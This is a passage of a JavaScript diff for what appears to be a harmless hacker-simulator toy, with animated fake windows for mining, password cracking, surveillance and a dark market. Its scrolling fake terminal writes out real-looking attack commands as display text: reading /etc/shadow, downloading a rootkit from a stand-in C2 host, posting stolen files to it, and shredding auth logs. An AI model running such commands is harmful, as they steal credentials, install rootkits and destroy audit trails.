+    case 'remote':   openRemote();   break;
+    case 'sat':      openSatellite(); break;
+    case 'cctv':     openCCTV();     break;
+    case 'nuclear':  openNuclear();  break;
+    case 'interpol': openInterpol(); break;
+    case 'deals':    openDeals();    break;
+  }
+}
+
+/* ── BITCOIN MINER ── */
+function openMiner() {
+  const id = 'win-miner';
+  const ip1 = rip(), ip2 = rip();
+  const btc = rbtc();
+  const html = `
+    <div class="log-scroll" id="miner-log" style="height:118px;flex-shrink:0">
+      <p class="ld">[INIT] Loading CUDA runtime 12.3... <span class="lg">OK</span></p>
+      <p class="ld">[INIT] GPU enumeration... <span class="lg">2 devices found</span></p>
+      <p>[CONNECT] Stratum+tcp://pool.nexusminer.io:3333</p>
+      <p class="lw">&gt; Connecting to <span class="lg">${ip1}</span>...</p>
+      <p class="lg">Permission granted!</p>
+      <p>[GPU:0] RTX 4090 — VRAM 24 GB — Temp 41°C — Fan 62%</p>
+      <p>[GPU:1] RTX 4080 — VRAM 16 GB — Temp 38°C — Fan 58%</p>
+      <p>[OC] Core +200 MHz | Mem +1200 MHz | PL 380W</p>
+      <p>[AUTH] Worker <span class="lg">nexus_bot_9912</span> authenticated to <span class="lg">${ip2}</span></p>
+    </div>
+    <div style="font-size:11px;color:#666;padding:2px 0">
+      Wallet: <span id="miner-btc" class="green-text">${btc}</span> BTC
+      &asymp; $<span id="miner-usd" class="green-text">${(btc*67000).toFixed(2)}</span>
+    </div>
+    <table class="data-table" id="miner-table">
+      <thead><tr><th>Device</th><th>Accepted</th><th>Rejected</th><th>GH/s (5s)</th></tr></thead>
+      <tbody>
+        <tr><td>GPU:0 RTX 4090</td><td id="m-a1">0</td><td>0</td><td id="m-g1">0.00</td></tr>
+        <tr><td>GPU:1 RTX 4080</td><td id="m-a2">0</td><td>0</td><td id="m-g2">0.00</td></tr>
+        <tr class="sum-row"><td><b>Sum</b></td><td id="m-as">0</td><td>0</td><td id="m-gs">0.00</td></tr>
+      </tbody>
+    </table>
+    <div style="display:flex;align-items:center;gap:10px">
+      <button class="hk-btn" id="miner-btn" onclick="startMining()">⚡ Start Mining</button>
+      <span id="miner-status" class="mid-text" style="font-size:10px"></span>
+    </div>`;
+  makeWin({ id, title: 'Bitcoin Miner v3.2 — pool.nexusminer.io', glyph: '₿', w: 490, h: 360, content: html });
+}
+
+let miningInterval;
+function startMining() {
+  const btn = document.getElementById('miner-btn');
+  if (!btn || btn.disabled) return;
+  btn.textContent = '⏳ Mining...'; btn.disabled = true;
+  document.getElementById('miner-status').textContent = 'Hashing active...';
+  let a1=0, a2=0, btcVal = parseFloat(document.getElementById('miner-btc')?.textContent||0);
+  const log = document.getElementById('miner-log');
+  clearInterval(miningInterval);
+  miningInterval = setInterval(() => {
+    a1 += r(1,3); a2 += r(1,2);
+    const g1 = (68 + Math.random()*6 - 3).toFixed(2);
+    const g2 = (44 + Math.random()*5 - 2.5).toFixed(2);
+    btcVal += 0.0000004 + Math.random()*0.0000003;
+    const map = {
+      'm-a1': a1, 'm-a2': a2, 'm-as': a1+a2,
+      'm-g1': g1, 'm-g2': g2, 'm-gs': (+g1+ +g2).toFixed(2),
+      'miner-btc': btcVal.toFixed(6),
+      'miner-usd': (btcVal*67000).toFixed(2)
+    };
+    for (const [k,v] of Object.entries(map)) {
+      const el = document.getElementById(k); if(el) el.textContent = v;
+    }
+    if (log && Math.random() < 0.4) {
+      const msgs = [
+        `[SHARE] Accepted [${r(100,999)}] diff ${r(2,8)}K — valid`,
+        `[BLOCK] Height ${r(840000,900000)} — nonce searching...`,
+        `[GPU:0] Temp: ${r(68,82)}°C | Fan: ${r(74,95)}%`,
+        `[POOL] Latency: ${r(10,42)}ms | Peers: ${r(220,310)}`,
+        `[SHARE] Found solution hash 0x${r(0,0xffffff).toString(16).padStart(6,'0')}...`,
+      ];
+      const p = document.createElement('p');
+      p.className = 'lg';
+      p.textContent = msgs[r(0,msgs.length-1)];
+      log.appendChild(p);
+      log.scrollTop = log.scrollHeight;
+    }
+  }, 800);
+}
+
+/* ── PASSWORD CRACKER ── */
+function openCracker() {
+  const id = 'win-crack';
+  const targetIP = rip();
+  const cells = Array.from({length:21}, (_,i) => `<div class="crack-cell" id="cc${i}">✕</div>`).join('');
+  const html = `
+    <div class="crack-tabs">
+      <div class="crack-tab active">Crack</div>
+      <div class="crack-tab mid-text">Reset</div>
+      <div class="crack-tab mid-text">Penetrate</div>
+    </div>
+    <div class="info-grid" style="margin-bottom:6px">
+      <span class="ig-label">Target:</span><span class="ig-val">${targetIP}</span>
+      <span class="ig-label">Database:</span><span style="color:#aaa">USERS_ADMIN_TABLE</span>
+      <span class="ig-label">Role:</span><span style="color:#aaa">Administrator</span>
+      <span class="ig-label">Threat:</span><span class="red-text">CRITICAL</span>
+      <span class="ig-label">Attack:</span><span style="color:#aaa">BRUTE-FORCE + DICT</span>
+    </div>
+    <div style="font-size:9.5px;color:#555;margin-bottom:3px">ATTEMPT LOG:</div>
+    <div id="crack-attempt" style="font-size:11px;color:#666;min-height:15px;font-family:var(--font);margin-bottom:4px"></div>
+    <div class="prog-track" style="margin-bottom:5px"><div class="prog-fill" id="crack-prog" style="width:0%"></div></div>
+    <div class="crack-grid">${cells}</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;font-size:11px;text-align:center;margin:5px 0">
+      <div><div class="mid-text" style="font-size:9px">ATTEMPTS</div><div id="crack-attempts" class="green-text">0</div></div>
+      <div><div class="mid-text" style="font-size:9px">SPEED</div><div id="crack-speed" class="green-text">0/s</div></div>
+      <div><div class="mid-text" style="font-size:9px">STATUS</div><div id="crack-status" class="green-text">STANDBY</div></div>
+    </div>
+    <div style="display:flex;gap:8px">
+      <button class="hk-btn red" id="crack-btn" onclick="startCracking()">⚡ Start Brute Force Attack</button>
+    </div>
+    <div style="font-size:8.5px;color:#2a2a2a;margin-top:3px;font-style:italic">// Authorized security testing only. NEXUS Corp accepts no liability.</div>`;
+  makeWin({ id, title: 'Password Cracker v5.0 — NSA Mainframe', glyph: '🔓', w: 400, h: 400, content: html });
+}
+
+let crackInterval;
+function startCracking() {
+  const btn = document.getElementById('crack-btn');
+  if (!btn || btn.disabled) return;
+  btn.disabled = true; btn.textContent = '🔴 Running Attack...';
+  document.getElementById('crack-status').textContent = 'RUNNING';
+  const words = ['admin','password','123456','root','letmein','qwerty','monkey','dragon',
+    'pass','shadow','sunshine','princess','superman','batman','football',
+    'welcome','login','iloveyou','starwars','solo','admin123','1234','hunter2'];
+  let done = 0, total = 21, count = 0;
+  clearInterval(crackInterval);
+  crackInterval = setInterval(() => {
+    count += r(80, 220);
+    const prog = (done / total) * 100;
+    const el = { p: document.getElementById('crack-prog'), a: document.getElementById('crack-attempt'),
+                  n: document.getElementById('crack-attempts'), s: document.getElementById('crack-speed'),
+                  st: document.getElementById('crack-status') };
+    if (el.p) el.p.style.width = Math.min(100, prog) + '%';
+    if (el.a) el.a.textContent = words[r(0,words.length-1)] + '_' + r(100,9999);
+    if (el.n) el.n.textContent = count.toLocaleString();
+    if (el.s) el.s.textContent = r(900,1600) + '/s';
+    if (done < total && Math.random() < 0.35) {
+      const cell = document.getElementById('cc' + done);
+      if (cell) { cell.textContent = '✓'; cell.classList.add('done'); done++; }
+    }
+    if (done >= total) {
+      clearInterval(crackInterval);
+      if (el.a) el.a.textContent = 'SUCCESS: Admin password found! Hash: $6$salt$' + r(0,0xffffff).toString(16);
+      if (el.st) { el.st.textContent = 'CRACKED'; el.st.className = 'green-text'; }
+      if (btn) { btn.textContent = '✅ Password Cracked'; btn.className = 'hk-btn'; }
+    }
+  }, 280);
+}
+
+/* ── REMOTE CONNECTION ── */
+const HACKER_LINES = [
+  () => `[NEXUS] Session established → ${rip()} via encrypted tunnel`,
+  () => `root@mainframe:~# cat /etc/shadow | head -20`,
+  () => `root:$6$salt$EncryptedHash:18234:0:99999:7:::`,
+  () => `admin:$6$xyz$AnotherHash:18200:0:99999:7:::`,
+  () => `root@mainframe:~# nmap -sV -p- --script vuln ${rip()}`,
+  () => `Starting Nmap 7.94 at 2026-09-09 17:22 UTC`,
+  () => `PORT     STATE  SERVICE    VERSION`,
+  () => `22/tcp   open   ssh        OpenSSH 8.9p1 Ubuntu`,
+  () => `80/tcp   open   http       Apache 2.4.54`,
+  () => `443/tcp  open   https      nginx 1.24.0`,
+  () => `3306/tcp open   mysql      MySQL 8.0.33`,
+  () => `| vuln-check: POSSIBLE BUFFER OVERFLOW — CVE-2024-${r(1000,9999)}`,
+  () => `root@mainframe:~# sqlmap -u "http://${rip()}/login.php" --dbs`,
+  () => `[INFO] back-end DBMS: MySQL 8.x`,
+  () => `[INFO] available databases: [information_schema, users_db, admin_panel, prism_logs]`,
+  () => `root@mainframe:~# python3 exploit.py --target ${rip()} --payload ring0`,
+  () => `[*] Generating shellcode (x86_64)... DONE`,
+  () => `[*] Sending payload to 0x7fff${r(0x1000,0xffff).toString(16)}${r(0,0xffff).toString(16)}`,
+  () => `[+] GOT overwritten. Jumping to shellcode...`,
+  () => `[+] Shell obtained! UID=0(root) GID=0(root) groups=0(root)`,
+  () => `root@mainframe:~# ls -la /root/classified/`,
+  () => `drwx------ 2 root root 4096 Sep  9 17:22 ops_logs`,
+  () => `-rw------- 1 root root  884 Sep  9 17:20 classified_ops.enc`,
+  () => `root@mainframe:~# wget http://c2.nexus-ops.net/rootkit.ko -q -O /tmp/rk.ko`,
+  () => `root@mainframe:~# insmod /tmp/rk.ko && echo "MODULE LOADED"`,
+  () => `MODULE LOADED`,
+  () => `[NEXUS_RK] Hooked sys_call_table @ 0xffffffff81800300`,
+  () => `[NEXUS_RK] Process list sanitized. PID hiding: ACTIVE`,
+  () => `root@mainframe:~# tar czf /tmp/exfil.tar.gz /etc/shadow /root/`,
+  () => `root@mainframe:~# curl -X POST http://c2.nexus-ops.net/drop -F file=@/tmp/exfil.tar.gz`,
+  () => `{"status":"received","size":"1.4MB","session":"${r(0,0xffff).toString(16)}-${r(0,0xffff).toString(16)}"}`,
+  () => `root@mainframe:~# history -c && shred -u /var/log/auth.log`,
+  () => `root@mainframe:~# # Traces cleared. Operation complete.`,
+];
+
+let remoteLineIdx = 0;
+function typeRemoteLine() {
+  const el = document.getElementById('remote-terminal');
+  if (!el) return;
+  const lineFn = HACKER_LINES[remoteLineIdx % HACKER_LINES.length];
+  remoteLineIdx++;
+  const p = document.createElement('p');
+  p.textContent = lineFn();
+  if (p.textContent.startsWith('WARNING') || p.textContent.includes('DENIED')) p.className = 'rt-warn';
+  else if (p.textContent.startsWith('[*]') || p.textContent.startsWith('[INFO]')) p.className = 'rt-dim';
+  el.appendChild(p);
+  el.scrollTop = el.scrollHeight;
+}
+
+function openRemote() {
+  const id = 'win-remote';
+  if (openWindows[id]) { bringToFront(id); return; }
+  const govIP = rip();
+  const html = `
+    <div style="font-size:10.5px;color:#666;margin-bottom:6px;border-bottom:1px solid #141414;padding-bottom:5px;flex-shrink:0">
+      Server IP address: <span class="green-text">${govIP}</span> / Main govt server.
+      <span class="red-text blink">&nbsp;WARNING: Top secret!</span>
+    </div>
+    <div class="remote-terminal" id="remote-terminal">
+      <p>NEXUS Shell v2.6 — Encrypted Connection Established</p>
+      <p class="rt-dim">Connected to ${govIP} | Cipher: AES-256-CBC | Auth: RSA-4096</p>
+      <p class="rt-dim">Type anything to begin hacking...</p>
+    </div>`;
+  const win = makeWin({ id, title: `Remote Connection — ${govIP} — Main Govt Server`, glyph: '⌨', w: 590, h: 380, content: html });
+  if (win) {
+    const body = win.querySelector('.win-body');
+    if (body) { body.style.padding = '8px'; body.style.display = 'flex'; body.style.flexDirection = 'column'; }
+  }
+}
+
+/* ── SATELLITE CONNECTION ── */
+function openSatellite() {
+  const id = 'win-sat';
+  const az = r(0,359), el = r(10,85), sig = r(78,98);
+  const lat = r(20,70), lon = r(10,140);
+  const html = `
+    <div class="passive-center" style="gap:14px">
+      <div id="sat-p0" class="sat-phase active">
+        <div style="font-size:34px">🌐</div>
+        <div class="green-text" style="font-size:13px;letter-spacing:1px">CONNECTING TO ORBITAL RELAY...</div>
+        <div class="mid-text" style="font-size:10px">Scanning frequencies 1.2–1.7 GHz</div>
+        <div class="mid-text" style="font-size:10px">SIGINT protocol: ACTIVE</div>
+      </div>
+      <div id="sat-p1" class="sat-phase">
+        <div style="font-size:34px">📡</div>
+        <div class="green-text" style="font-size:13px;letter-spacing:1px">TRIANGULATING SIGNAL VECTORS...</div>
+        <div class="mid-text" style="font-size:10px">AZ: ${az}° | EL: ${el}° | Signal: ${sig}%</div>
+        <div class="mid-text" style="font-size:10px">Uplink: 128 kbps | Downlink: 512 kbps</div>
+      </div>
+      <div id="sat-p2" class="sat-phase">
+        <div style="display:flex;gap:12px;font-size:26px">🛰🛰🛰</div>
+        <div class="green-text" style="font-size:12px;letter-spacing:1px">KH-11 OPTICAL RECONNAISSANCE — LINKED</div>
+        <div class="mid-text" style="font-size:10px">Altitude: ${r(300,500)} km | Footprint: 2,800 km²</div>
+        <div style="font-size:26px;margin-top:4px">🗺</div>
+        <div class="red-text blink" style="font-size:11px;letter-spacing:1px">📍 TARGET ACQUIRED — ${lat}°N ${lon}°E</div>
+      </div>
+    </div>`;
+  makeWin({ id, title: 'Satellite Connection — KH-11 Uplink', glyph: '🛰', w: 340, h: 270, content: html });
+  let phase = 0;
+  const timer = setInterval(() => {
+    document.getElementById(`sat-p${phase}`)?.classList.remove('active');
+    phase++;
+    if (phase > 2) { clearInterval(timer); return; }
+    document.getElementById(`sat-p${phase}`)?.classList.add('active');
+  }, 1800);
+}
+
+/* ── CCTV ── */
+function openCCTV() {
+  const cells = Array.from({length:6}, (_,i) => `
+    <div class="cam-cell">
+      <div class="cam-static"></div>
+      <div style="font-size:20px;z-index:1">📷</div>
+      <div style="font-size:8px;color:#2a2a2a;position:absolute;top:3px;left:5px;z-index:1">CAM-${String(i+1).padStart(2,'0')}</div>
+      <div style="font-size:8px;color:#2a2a2a;position:absolute;bottom:3px;right:5px;z-index:1">${r(0,23).toString().padStart(2,'0')}:${r(0,59).toString().padStart(2,'0')}:${r(0,59).toString().padStart(2,'0')}</div>
+      <div style="position:absolute;bottom:3px;left:5px;width:5px;height:5px;border-radius:50%;background:var(--green);animation:pulse 2s infinite;box-shadow:0 0 5px var(--green);z-index:1"></div>
+    </div>`).join('');
+  const html = `
+    <div style="font-size:9.5px;color:#444;margin-bottom:5px;flex-shrink:0">LIVE SURVEILLANCE GRID — <span class="green-text">6/6 CAMERAS ONLINE</span></div>
+    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:3px;flex:1">${cells}</div>
+    <div style="margin-top:5px;font-size:9.5px;color:#333;flex-shrink:0">
+      REC <span class="red-text blink">●</span> ACTIVE &nbsp;|&nbsp; Storage: ${r(68,92)}% &nbsp;|&nbsp; Retention: 30 days &nbsp;|&nbsp; Resolution: 4K
+    </div>`;
+  makeWin({ id: 'win-cctv', title: 'Surveillance CCTV Grid — 6 Feeds Active', glyph: '📷', w: 470, h: 360, content: html });
+}
+
+/* ── NUCLEAR PLANT ── */
+function openNuclear() {
+  const rods = Array.from({length:18}, (_,i) => `<div class="rod-cell" id="rod${i}">ROD-${String(i+1).padStart(2,'0')}</div>`).join('');
+  const html = `
+    <div style="font-size:9.5px;color:#555;margin-bottom:5px;flex-shrink:0">REACTOR CORE STATUS — UNIT 4 / MONITORING ACTIVE</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:6px;font-size:11px;margin-bottom:7px;flex-shrink:0">
+      <div><div class="mid-text" style="font-size:9px">TEMP (°C)</div><div class="green-text" id="nuc-temp">312</div></div>
+      <div><div class="mid-text" style="font-size:9px">PRESSURE</div><div class="green-text" id="nuc-pres">7.2 MPa</div></div>
+      <div><div class="mid-text" style="font-size:9px">OUTPUT</div><div class="green-text" id="nuc-out">1,200 MW</div></div>
+      <div><div class="mid-text" style="font-size:9px">STATUS</div><div class="green-text" id="nuc-stat">NOMINAL</div></div>
+    </div>
+    <div class="rod-grid">${rods}</div>
+    <div style="display:flex;gap:7px;margin-top:7px;flex-shrink:0">
+      <button class="hk-btn" onclick="nuclearScram()">⚠ SCRAM Shutdown</button>
+      <button class="hk-btn red" onclick="nuclearOverheat()">🔴 Override Coolant</button>
+    </div>`;
+  makeWin({ id: 'win-nuclear', title: 'Nuclear Plant — Reactor Core #4 Control', glyph: '⚛', w: 430, h: 340, content: html });
+  startNuclearTick();
+}
+
+let nuclearInterval, nuclearTemp = 312;
+function startNuclearTick() {
+  clearInterval(nuclearInterval);
+  nuclearInterval = setInterval(() => {
+    nuclearTemp += r(-4,6);
+    const pres = (7.2 + Math.random()*0.5 - 0.25).toFixed(1);
+    const out = r(1180, 1240);
+    const set = (id, v) => { const el = document.getElementById(id); if(el) el.textContent = v; };
+    set('nuc-temp', nuclearTemp);
+    set('nuc-pres', pres + ' MPa');
+    set('nuc-out', out.toLocaleString() + ' MW');
+    for (let i=0; i<18; i++) {
+      const rod = document.getElementById('rod'+i);
+      if (!rod) continue;
+      const v = Math.random();
+      rod.className = 'rod-cell' + (v < 0.1 ? ' critical' : v < 0.28 ? ' hot' : '');
+    }
+    const stat = document.getElementById('nuc-stat');
+    if (stat) {
+      if (nuclearTemp > 500) { stat.textContent = 'CRITICAL'; stat.style.color = 'var(--red)'; }
+      else if (nuclearTemp > 400) { stat.textContent = 'WARNING'; stat.style.color = 'var(--orange)'; }
+      else { stat.textContent = 'NOMINAL'; stat.style.color = 'var(--green)'; }
+    }
+  }, 1100);
+}
+function nuclearScram() {
+  nuclearTemp = 200;
+  const s = document.getElementById('nuc-stat');
+  if (s) { s.textContent = 'SCRAM'; s.style.color = 'var(--red)'; }
+}
+function nuclearOverheat() {
+  nuclearTemp = 620;
+  const s = document.getElementById('nuc-stat');
+  if (s) { s.textContent = 'MELTDOWN'; s.style.color = 'var(--red)'; }
+  for(let i=0;i<18;i++) {
+    const rod = document.getElementById('rod'+i);
+    if (rod) rod.className = 'rod-cell critical';
+  }
+}
+
+/* ── INTERPOL ── */
+const SUSPECTS = [
+  { name:'SHADOW_BYTE',    crime:'Global Mainframe Infiltration',      nat:'RUS', bounty:'$5,000,000',  avatar:'👤' },
+  { name:'ZERO_DAY_ZERO',  crime:'Critical Infrastructure Attack',     nat:'CHN', bounty:'$3,200,000',  avatar:'🎭' },
+  { name:'PHANTOM_NODE',   crime:'Satellite System Hijack',            nat:'PRK', bounty:'$8,500,000',  avatar:'👁' },
+  { name:'CIPHER_GHOST',   crime:'SWIFT Banking Network Breach',       nat:'IRN', bounty:'$4,700,000',  avatar:'💀' },
+  { name:'ARCTIC_VIPER',   crime:'NSA Classified Data Exfiltration',   nat:'UKN', bounty:'$12,000,000', avatar:'🐍' },
+];
+
+function openInterpol() {
+  const rows = SUSPECTS.map((s,i) => `
+    <div class="suspect-row" onclick="showSuspect(${i})">
+      <div class="suspect-avatar">${s.avatar}</div>
+      <div class="suspect-info">
+        <div class="suspect-name">${s.name}</div>
+        <div>${s.crime}</div>
+        <div style="font-size:9.5px;color:#444;margin-top:1px">NAT: ${s.nat} | BOUNTY: <span style="color:var(--orange)">${s.bounty}</span></div>
+      </div>
+      <div style="margin-left:auto;font-size:16px;color:var(--red);flex-shrink:0">🔴</div>
+    </div>`).join('');
+  const html = `
+    <div style="font-size:9.5px;color:#444;margin-bottom:5px;flex-shrink:0">INTERPOL RED NOTICE DATABASE // ${SUSPECTS.length} ACTIVE MATCHES</div>
+    <div style="flex:1;overflow-y:auto">${rows}</div>
+    <div style="margin-top:7px;flex-shrink:0">
+      <button class="hk-btn red" onclick="transmitRedNotice()">📡 TRANSMIT RED NOTICE ARREST WARRANT</button>
+    </div>`;
+  makeWin({ id: 'win-interpol', title: 'INTERPOL Red Notice Database — CLASSIFIED', glyph: '🎯', w: 430, h: 380, content: html });
+}
+
+function showSuspect(i) {
+  const s = SUSPECTS[i];
+  const html = `
+    <div style="display:flex;gap:12px;align-items:flex-start">
+      <div style="width:64px;height:80px;background:#0d0d0d;border:1px solid #2a2a2a;display:flex;align-items:center;justify-content:center;font-size:32px;flex-shrink:0">${s.avatar}</div>
+      <div class="info-grid" style="flex:1">
+        <span class="ig-label">Handle:</span><span class="ig-val" style="font-size:13px;font-weight:700">${s.name}</span>
+        <span class="ig-label">Crime:</span><span style="color:#aaa">${s.crime}</span>
+        <span class="ig-label">Nationality:</span><span style="color:#aaa">${s.nat}</span>
+        <span class="ig-label">Bounty:</span><span class="orange-text">${s.bounty}</span>
+        <span class="ig-label">Status:</span><span class="red-text blink">ARMED &amp; DANGEROUS</span>
+        <span class="ig-label">Notice:</span><span style="color:#555">I-${r(10000,99999)}/2026</span>
+      </div>
+    </div>
+    <div style="margin-top:10px;font-size:9.5px;padding:6px;background:#060606;border:1px solid #141414;color:#444;line-height:1.6">
+      This notice is published for law enforcement use only and does not constitute an arrest.
+      Contact your national central bureau for coordination. INTERPOL Reference: RED-${r(100000,999999)}.
+    </div>
+    <button class="hk-btn" style="margin-top:8px" onclick="closeWin('win-suspect')">← Back to Database</button>`;
+  makeWin({ id: 'win-suspect', title: `RED NOTICE — ${s.name}`, glyph: '🔴', w: 370, h: 280, content: html });
+}
+
+function transmitRedNotice() {
+  const el = document.querySelector('#win-interpol .win-title-text');
+  if (el) el.textContent = 'INTERPOL — WARRANT TRANSMITTED ✓';
+}
+
+/* ── DARK MARKET ── */
+function openDeals() {
+  const items = [
+    { name: 'Zero-Day Bundle (Chrome+FF)',     price: '4.20 BTC', seller: 'sh4d0wm4rk3t', age: '2h ago' },
+    { name: 'Botnet 50K nodes — 24hr rental',  price: '0.88 BTC', seller: 'darkweb_lord',  age: '4h ago' },
+    { name: 'Credit Card DB — 2M records',     price: '1.15 BTC', seller: 'c4rd3r_x0',     age: '8h ago' },
+    { name: 'GovMail SMTP Access ×3',          price: '0.32 BTC', seller: 'phantom_sell',  age: '12h ago'},
+    { name: 'RDP Access — Fortune 500 Corp',   price: '2.70 BTC', seller: 'root_dealer',   age: '1d ago' },
+    { name: 'CIA Internal Docs Dump 2026',     price: '9.00 BTC', seller: 'arctic_viper',  age: '3d ago' },
+  ];
+  const rows = items.map((it,i) => `
+    <div class="deal-row">
+      <div style="flex:1;font-size:11px;color:#999">${it.name}</div>
+      <div style="font-size:10px;color:#555;white-space:nowrap;margin-right:4px">${it.age}</div>
+      <div style="font-size:11px;color:var(--orange);white-space:nowrap;min-width:70px;text-align:right">${it.price}</div>
+      <div style="font-size:9px;color:#333;white-space:nowrap;margin-left:6px;min-width:90px">${it.seller}</div>
+      <button class="hk-btn" id="deal-btn-${i}" style="padding:2px 9px;font-size:10px;margin-left:6px" onclick="buyDeal(${i})">Buy</button>
+    </div>`).join('');
+  const html = `
+    <div style="font-size:9.5px;color:#444;margin-bottom:5px;flex-shrink:0">DARK MARKET v3 — ANONYMOUS // TOR CIRCUIT ACTIVE // ESCROW ENABLED</div>
+    <div style="flex:1;overflow-y:auto">${rows}</div>
+    <div style="margin-top:6px;font-size:9px;color:#2a2a2a;flex-shrink:0">Escrow: 0x8f4...c2a | PGP: <span style="color:#333">VERIFIED</span> | Uptime: 99.7%</div>`;
+  makeWin({ id: 'win-deals', title: 'Dark Market — Goods & Exploits', glyph: '💸', w: 520, h: 320, content: html });
+}
+
+function buyDeal(i) {
+  const btn = document.getElementById(`deal-btn-${i}`);
+  if (btn) { btn.textContent = 'Ordered ✓'; btn.disabled = true; btn.style.color = 'var(--green)'; }
+}
+
+/* ═══════════════════════════════════════
+   PASSIVE WINDOWS (number keys 0–9)
+   ═══════════════════════════════════════ */
+
+function openPassive(n) {
+  hideIntro();
+  switch(n) {
+    case 1: openAccessDenied(); break;
+    case 2: openPermGranted(); break;
+    case 3: openSelfDestruct(); break;
+    case 4: openClassified(); break;
+    case 5: openNeural(); break;
+    case 6: openCompiling(); break;
+    case 7: openMalware(); break;
+    case 8: openDownload(); break;
+    case 9: openSatellitePassive(); break;
+    case 0: openLocator(); break;
+  }
+}
+
+/* 1 — ACCESS DENIED */
+function openAccessDenied() {
+  const html = `
+    <div class="access-denied-box">
+      <div class="deny-icon">🚫</div>
+      <div class="deny-title blink">🗙 ACCESS DENIED</div>
+      <div class="deny-sub">SECURITY CLEARANCE LEVEL-9 REQUIRED<br>INTRUSION DETECTED — ALARM ACTIVATED<br>ALL ACCESS LOGGED</div>
+      <div style="font-size:9.5px;color:#5a1111;margin-top:4px">SESSION ID: ${r(100000,999999)} — IP LOGGED — AUTHORITIES NOTIFIED</div>
+    </div>`;
+  makeWin({ id: `win-denied-${Date.now()}`, title: '🗙 ACCESS DENIED — Security Alert', glyph: '🚫', w: 320, h: 230, content: html });
+}
+
+/* 2 — PERMISSION GRANTED */
+function openPermGranted() {
+  const sessKey = Array.from({length:4}, () => r(0,65535).toString(16).padStart(4,'0')).join('-');
+  const html = `
+    <div class="passive-center" style="background:linear-gradient(135deg,#001200,#000)">
+      <div style="font-size:48px">🔓</div>
+      <div class="green-text" style="font-size:17px;font-weight:700;letter-spacing:2px">✅ PERMISSION GRANTED</div>
+      <div class="mid-text" style="font-size:10px">MAINFRAME ROOT ACCESS DECRYPTED</div>
+      <div class="mid-text" style="font-size:10px">Privilege level: <span class="green-text">ROOT</span></div>
+      <div style="font-size:10px;color:#3a3a3a;margin-top:4px">Session key: ${sessKey}</div>
+    </div>`;
+  makeWin({ id: `win-perm-${Date.now()}`, title: '✅ Permission Granted — Root Access', glyph: '🔓', w: 300, h: 230, content: html });
+}
+
+/* 3 — SELF DESTRUCT */
+function openSelfDestruct() {
+  const uid = Date.now();
+  const id = `win-sd-${uid}`;
+  const html = `
+    <div class="passive-center" style="background:#070000;border:1px solid #3a0000;height:100%">
+      <div class="red-text" style="font-size:11px;letter-spacing:2px">⚠ SELF DESTRUCT SEQUENCE ENGAGED</div>
+      <div class="big-num" id="sd-timer-${uid}">10:00</div>
+      <div class="red-text" style="font-size:10px;letter-spacing:1px">ALL DATA WILL BE PERMANENTLY WIPED</div>
+      <div class="mid-text" style="font-size:9.5px">Sectors: /dev/sda1 /dev/sdb1 /dev/sdc1</div>
+      <button class="hk-btn red" onclick="abortSD('${uid}')">■ ABORT SEQUENCE</button>
+    </div>`;
+  makeWin({ id, title: '⚠ SELF DESTRUCT — SEQUENCE ENGAGED', glyph: '💣', w: 310, h: 260, content: html });
+  let secs = 600;
+  const iv = setInterval(() => {
+    secs = Math.max(0, secs - 1);
+    const el = document.getElementById(`sd-timer-${uid}`);
+    if (!el || !document.getElementById(id)) { clearInterval(iv); return; }
+    const m = Math.floor(secs/60), s = secs%60;
+    el.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+    if (secs === 0) { clearInterval(iv); closeWin(id); }
+  }, 1000);
+}
+function abortSD(uid) {
+  const el = document.getElementById(`sd-timer-${uid}`);
+  const id = `win-sd-${uid}`;
+  if (el) { el.textContent = 'ABORTED'; el.style.color = 'var(--green)'; el.style.fontSize = '28px'; el.style.textShadow = '0 0 20px var(--green)'; }
+  const titleEl = document.querySelector(`#${id} .win-title-text`);
+  if (titleEl) titleEl.textContent = '✓ Abort Confirmed — Sequence Cancelled';
+}
+
+/* 4 — CLASSIFIED */
+function openClassified() {
+  const html = `
+    <div class="passive-center">
+      <div style="font-size:11px;color:#3a3a3a;letter-spacing:1px">DOC ID: #NS-${r(1000,9999)}-C/SCT/NF</div>
+      <div style="font-size:10px;color:#3a3a3a">Authorized for: EYES ONLY — SCI ACCESS REQUIRED</div>
+      <div style="margin:10px 0"><div class="stamp-box">TOP SECRET</div></div>
+      <div style="font-size:10px;color:#444;max-width:240px;line-height:1.7;text-align:center">
+        This document is classified under Executive Order 13526 (Sec 1.4(c)).
+        Unauthorized disclosure is a criminal offense under 18 U.S.C. § 798.
+      </div>
+    </div>`;
+  makeWin({ id: `win-class-${Date.now()}`, title: '🔒 TOP SECRET // CLASSIFIED // NOFORN', glyph: '🔒', w: 320, h: 260, content: html });
+}
+
+/* 5 — NEURAL NETWORK TRACING */
+function openNeural() {
+  const id = `win-neural-${Date.now()}`;
+  const html = `
+    <div style="font-size:9.5px;color:#555;flex-shrink:0">NEURAL SYNAPSE TRACER — 8,420 NODES/SEC — ANOMALY INDEX: ${(Math.random()*0.4).toFixed(3)}</div>
+    <canvas id="nn-canvas-${id}" height="170" style="width:100%;border:1px solid #111;background:#020202;flex-shrink:0"></canvas>
+    <div style="font-size:9.5px;color:#3a3a3a">NETWORK MAP LOADED — Layer depth: 12 — Activation: ReLU</div>`;
+  makeWin({ id, title: '🧠 Neural Network Tracing — Live Analysis', glyph: '🧠', w: 350, h: 260, content: html });
+  requestAnimationFrame(() => {
+    const c = document.getElementById(`nn-canvas-${id}`);
+    if (!c) return;
+    c.width = c.offsetWidth;
+    const ctx = c.getContext('2d');
+    const nodes = Array.from({length:14}, () => ({
+      x: 10 + Math.random() * (c.width - 20),
+      y: 10 + Math.random() * 150,
+      r: r(3,8), vx: (Math.random()-0.5)*0.4, vy: (Math.random()-0.5)*0.4
+    }));
+    let frame = 0;
+    function draw() {
+      if (!document.getElementById(id)) return;
+      ctx.clearRect(0,0,c.width,170);
+      ctx.lineWidth = 0.8;
+      for (let i=0;i<nodes.length;i++) for (let j=i+1;j<nodes.length;j++) {
+        const dx=nodes[i].x-nodes[j].x, dy=nodes[i].y-nodes[j].y;
+        const dist=Math.sqrt(dx*dx+dy*dy);
+        if (dist < 120) {
+          ctx.strokeStyle = `rgba(51,255,51,${0.08*(1-dist/120)})`;
+          ctx.beginPath(); ctx.moveTo(nodes[i].x,nodes[i].y); ctx.lineTo(nodes[j].x,nodes[j].y); ctx.stroke();
+        }
+      }
+      nodes.forEach((n,i) => {
